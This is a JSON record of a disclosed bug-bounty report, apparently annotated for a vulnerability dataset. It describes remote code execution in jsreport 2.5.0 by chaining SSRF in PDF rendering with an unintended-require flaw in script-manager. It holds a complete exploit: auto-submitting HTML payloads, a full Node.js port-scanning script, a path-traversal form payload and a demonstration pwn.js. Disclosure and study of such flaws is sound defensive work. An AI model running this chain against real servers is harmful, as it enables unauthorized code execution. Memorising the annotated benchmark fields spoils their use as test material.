{
  "reported_to": "Node.js third-party modules",
  "reported_by": "ermilov ",
  "title": "[jsreport] Remote Code Execution",
  "content": "\nI would like to report Remote Code Execution in jsreport\nIt allows running js files remotely on a vulnerable server.\nModule\nmodule name: jsreport\nversion: 2.5.0\nnpm page: https://www.npmjs.com/package/jsreport\nModule Description\njsreport is a reporting server which lets developers define reports using javascript templating engines (like jsrender or handlebars). It supports various report output formats like html, pdf, excel and others. It also includes advanced reporting features like user management, REST API, scheduling, designer or sending emails.\nModule Stats\n52 downloads in the last day\n2056 downloads in the last week\n6428 downloads in the last month\nVulnerability\nVulnerability Description\njsreport consists of a variety of packages which combines in one working application. Script-manager is one of them, it is utilized for running user's scripts in a sandbox and has an unintended require vulnerability (I have a separate report describing this vulnerability) which allows an attacker to load code that was not intended to execute. Another module is Puppeteer which is headless Chrome Node API. The application uses it for turning user's HTML into pdf files and unfortunately, the way it is applied allows fetching URLs and sending requests defined in an HTML file by a user which is known as SSRF (Server Side Request Forgery). Chaining these two vulnerabilities (Unintended require + SSRF) leads to remote code execution possibility.\nSSRF:\nSSRF itself is quite simple, generating a pdf report from an HTML template like this one:\nCode 582 Bytes\n1    <html>\n2    <head>\n3        <meta content=\"text/html; charset=utf-8\" http-equiv=\"Content-Type\">\n4    </head>\n5    <body>\n6    \t\t<!-- will send GET request to example.com -->\n7        <img src=\"http://example.com/\" />\n8    \t\t<!-- will send POST request to example.com -->\n9    \t\t<form id=\"pwn-form\" method=\"POST\" action=\"http://example.com/action\">\n10            <input type=\"hidden\" name='SomeField' value='Some Value' />\n11        </form>\n12        <script>\n13            var form = document.getElementById(\"pwn-form\");\n14            form.submit();\n15        </script>\n16    </body>\n17    </html>\n18    \nwill perform requests from the server to example.com (GET and POST according to examples)\n@@ pictures\nUnintended require:\nA detailed description of this bug can be found here #660563. The main idea of this vulnerability is that a separate server is running on a randomly chosen port and as long as we found out the port it is possible to send a request with the path to any script (located on the machine) that we want to execute.\nrequest example:\n{\"options\": {\"rid\": 12, \"execModulePath\": \"./../../../pwn.js\"}}\nHow to find port:\nIn order to exploit script-manager we can scan ports on the server which runs jsreport, by utilizing SSRF (discussed previously). To do it you should create an HTML template which sends an HTTP request to port you would like to check and render it as a pdf in the application. It is easy to distinguish result as long as the response is printed to the pdf output. Of course, it would take ages to check all the ports one-by-one, but I found out some tricks that allow to do it in a few minutes.\nFirst of all, it is possible to do many requests with one HTML page and by checking the output figure out which range of ports includes the one we look for.\nNext helpful thing is the usage of Debug mode, if you render the HTML template in Debug mode it returns the output from server log instead of pdf page itself. It saves time and gives a better understanding of what is happening server-side. So by sending a wrong request, you see the output like this:\nFailed to load resource: net::ERR_CONNECTION_REFUSED\nif we send a request to the port we are looking for a response would be like this:\nFailed to load resource: the server responded with a status of 500 (Internal Server Error)\nin other words, there will be an error in the server response\nand script-manager will restart the child server.\nHere is another trick: if we send requests too fast and do it before the child server starts again we get a very informative error in debug log:\nExecuting script test1 Error: connect ECONNREFUSED 127.0.0.1:39499\nHere we go: this is the needed port.\nIt is actually quite easy to automate these requests and create a script that will do all the work for you.\nThe final algorithm is:\nrun huge chunks of ports (I guess 1000 ports at a time is good)\nwhen we hit an error, try to run requests again and see if we lucky to get the port number in the error's output.\nif not we just split the range of ports in two halves and repeat steps 1 and 2 on both (divide and conquer approach)\nin the end we find an error or distinguish the final port by narrowing down the range of ports to the one.\nRCE Steps:\nFind out the port of script-manager's vulnerable server by utilizing SSRF in jsreport (and automation :))\nUse jsreport to create a js file that will be stored on the machine and which content will be executed on the server.\nUse SSRF again to send a crafted request to script-manager's vulnerable server and make it execute our file.\nDone! We executed a user created js file on the server.\njsreport_scheme_(1).png (F539728)\nSteps To Reproduce:\nrun jsreport, easiest way to do it is to run it as a docker container\nsudo docker run -p 80:5488 -v /jsreport-home:/jsreport jsreport/jsreport:2.5.0\ngo to http://localhost (or address to server where docker is running) in your browser\ncreate new template and name it 'test1'\nscreen1.png (F539730)\nscreen2.png (F539731)\nwrite some HTML to it (e.g. <h1>hello world</h1>) and click 'Save'\nscreen3_1.png (F539742)\ncreate portScanner.js localy (outside docker container)\nportScanner.js\nconst request = require('request')\nconst name = process.argv[2] // name of the template\nconst id = process.argv[3] // id of the template\nconst chunkSize = 1000\nconst jrUrl = process.argv[4]\n? ${process.argv[4]}/api/report/${name} // jsreport url if it is different from localhost\n: http://localhost/api/report/${name}\nfunction requestPromise(options) {\nreturn new Promise((resolve, reject) => {\nrequest.post(options, function optionalCallback(err, httpResponse, body) {\nif (err) {\nreturn reject(err)\n}\nresolve(body)\n});\n})\n}\nasync function checkPorts(start, finish) {\nlet content = `\nCode 3.01 KiB\n1      <html>\n2        <body>\n3          <script>\n4            function printImg(port) {\n5              var url = 'http://localhost:' + port;\n6              var resultDiv = document.getElementById('result');\n7              var img = document.createElement('img');\n8              img.src = url;\n9            }\n10            var ports = [];\n11            var start = ${start};\n12            var finish = ${finish};\n13            for (var i = start; i <= finish; i++) ports.push(i);\n14            ports.forEach(function(port) {\n15              printImg(port);\n16            })\n17          </script>\n18        </body>\n19      </html>\n20      `\n21      const formData = {\n22        template: {\n23          name: name,\n24          recipe: 'chrome-pdf',\n25          shortid: id,\n26          __entitySet: 'templates',\n27          __name: name,\n28          engine: 'handlebars',\n29          chrome: {printBackground: 'true'},\n30          content: content,\n31          __isLoaded: 'true',\n32          __recipe: 'chrome-pdf',\n33          __shortid: id,\n34          __isDirty: 'false'\n35        },\n36        options: {\n37          debug: {\n38            logsToResponse: 'true'\n39          },\n40          preview: 'true'\n41        }\n42      }\n43    \n44      const body = await requestPromise({url: jrUrl, form: formData})\n45      if (body.indexOf('connect ECONNREFUSED 127.0.0.1:') > -1) {\n46        const rgx = /connect ECONNREFUSED 127.0.0.1:(\\d*)/g\n47        const match = rgx.exec(body)\n48        console.log('match', match)\n49        return match[1] || true\n50      } else if (body.indexOf('Failed to load resource: the server responded with a status of 500 (Internal Server Error)') > -1) {\n51        return true\n52      } else \n53      return false\n54    }\n55    \n56    // checking ports by `divide and conquer` approach\n57    // which means checking a huge chunk of ports at once an then narrowing down till we hit the only possible port\n58    // takes about 16 iterations to figure it out\n59    // anyway its faster then manually checking 65k ports\n60    async function checker(start, finish) {\n61      const rp = await checkPorts(start, finish)\n62      if (rp) {\n63        if (typeof rp === 'string') { // string is returned when port is extracted from an error message\n64          return rp\n65        } else if (start === finish) {\n66          return start\n67        } else {\n68          const middle = Math.floor((finish + start) / 2)\n69          const tmp1 = await checker(start, middle)\n70          const tmp2 = await checker(middle+1, finish)\n71          return tmp1 || tmp2\n72        }\n73      }\n74    }\n75    \n76    (async function main(){\n77      // ports range\n78      const start = 1024\n79      const finish = 65535\n80    \n81      // split ports range into chunks of 1000\n82      let first = start\n83      let last = start + 1000\n84    \n85      let stopEnum = false\n86      while (!stopEnum) {\n87        if ( last > finish ) {\n88          last = finish\n89          stopEnum = true\n90        }\n91        // checking every port from `first` to `last`\n92        const result = await checker(first, last)\n93        if (result) {\n94          console.log(result);\n95          return;\n96        }\n97        first = last + 1\n98        last = first + 1000\n99      }\n100    })()\nrun portScanner.js\nnode portScanner.js test1 templateId\nwhere test1 - name of the template (actually 'test1' that we created previously)\ntemplateId - id of the template (may be extracted from the temlates URL)\n______________2019-07-26_14-28-56.png (F539733)\ne.g. node portScanner.js test1 BJe2Pi2AgB\nif you don't run docker on localhost you may add docker's address as a 3rd parameter (check portScanner.js code for clarity)\ne.g http://my-jsreport-addr.app\nnode portScanner.js test1 id_from_jsreport http://my-jsreport-addr.app\nwait untill it finishes and logs the port number\n12354.png (F539741)\nthen create a new script in jsreport and name it 'pwn.js'\nscreen4_1.png (F539734)\nscreen_5.png (F539735)\nthis script we will be able to execute on the server\nso for demonstration purposes source code is:\nconsole.log('PWNED')\nvar ls = require('fs').readdirSync('./')\nconsole.log(ls)\nthe idea is to list files in the application root directory\ninsert this source code into pwn.js\nscreen_6.png (F539736)\ncreate new template 'test2'\nscreen_7.png (F539737)\ninsert HTML code which will exploit the script-manager (change xxxx for the value of the previously found script-manager's port) and click Save\ndon't forget to put the right port into code snippet\nCode 594 Bytes\n1    <html>\n2    <head>\n3        <meta content=\"text/html; charset=utf-8\" http-equiv=\"Content-Type\">\n4    </head>\n5    <body>\n6        123 <img src=x />\n7    \t\t<!-- xxxx is the scipt-manager's port -->\n8        <form id=\"pwn-form\" enctype=\"text/plain\" method=\"POST\" action=\"http://localhost:xxxx/\">\n9            <input type=\"hidden\" name='{\"test' value='\":1, \"options\": {\"rid\": 12, \"execModulePath\": \"./../../../data/pwn.js/content.js\"}}' />\n10        </form>\n11        <script>\n12            var form = document.getElementById(\"pwn-form\");\n13            form.submit();\n14        </script>\n15    </body>\n16    </html>\nscreen_8.png (F539738)\nthen click Run (don't forget aboud 'chrome-pdf' mode)\nscreen_9.png (F539739)\nyou will see an error message as an output and result of 'pwn.js' logged to console on the server\npwn.png (F539740)\nPatch\nSupporting Material/References:\nOS: Linux Mint current\nNode.js: 10.16.0\nNPM: 6.9.0\nWrap up\nI contacted the maintainer to let them know: Y\nI opened an issue in the related repository: N\nImpact\nAn attacker is able to create and execute js code on the server\n\n",
  "severity": [
    8.0,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Remote File Inclusion"
  ],
  "screenshots": {},
  "disclosed_date": 1581107040,
  "report_url": "https://hackerone.com/reports/660565",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Run jsreport as a Docker container: `sudo docker run -p 80:5488 -v /jsreport-home:/jsreport jsreport/jsreport:2.5.0`"
    ],
    [
      2,
      "Access the jsreport interface at http://localhost"
    ],
    [
      3,
      "Create a new template named 'test1' with an HTML payload to perform SSRF"
    ],
    [
      4,
      "Use the portScanner.js script to identify the script-manager's vulnerable port"
    ],
    [
      5,
      "Create a malicious script 'pwn.js' to be executed on the server"
    ],
    [
      6,
      "Create another template 'test2' with an HTML payload to exploit the script-manager's port"
    ],
    [
      7,
      "Execute the template to trigger the RCE"
    ]
  ],
  "vuln_description": "The vulnerability involves chaining an unintended require vulnerability in the script-manager module with SSRF in the Puppeteer module of jsreport. This allows an attacker to execute arbitrary JavaScript code remotely on the server by first identifying the script-manager's port via SSRF and then sending a crafted request to execute a malicious script.",
  "reason": "The attack involves multiple components (script-manager, Puppeteer, SSRF, port scanning) and requires understanding their interactions. The port scanning technique is non-trivial and involves divide-and-conquer logic. The exploitation requires chaining two vulnerabilities in a novel way to achieve RCE.",
  "new_complexity": "HIGH",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": "660563",
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves chaining SSRF with an unintended require vulnerability to achieve RCE, which is not directly related to authentication or authorization boundaries within the same application. The methodology described focuses on testing authorization boundaries by swapping user sessions and resource IDs within the same application context, not exploiting server-side request forgery and file inclusion vulnerabilities.",
    "is_detectable": false
  }
}